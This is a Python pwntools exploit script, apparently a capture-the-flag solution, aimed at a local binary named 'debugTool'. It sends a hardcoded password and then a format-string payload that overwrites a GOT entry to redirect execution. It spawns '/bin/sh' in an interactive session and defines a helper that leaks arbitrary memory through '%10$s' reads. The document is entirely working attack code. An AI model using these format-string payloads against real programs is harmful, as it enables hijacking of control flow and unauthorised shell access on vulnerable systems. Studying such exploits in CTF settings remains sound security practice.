from pwn import *

cn = process('./debugTool')

cn.recvuntil('CMD:')
cn.sendline('WQamuB40953ZnL0H')

#fmt_len = 7

pay = fmtstr_payload(7,{0x0804B014:0x080486A0})

cn.recvuntil('MSG:')
cn.sendline(pay)
cn.recvuntil('MSG:')
cn.sendline('/bin/sh\x00')
cn.interactive()

def leak(addr):
	cn.recvuntil('MSG:')
	pay = 'AAAA%10$sBBB'+p32(addr)
	cn.sendline(pay)

	cn.recvuntil('ECHO:')
	cn.recvuntil('AAAA')
	data = cn.recvuntil('BBB')[:-3]
	#print data.encode('hex')
	return data+'\x00'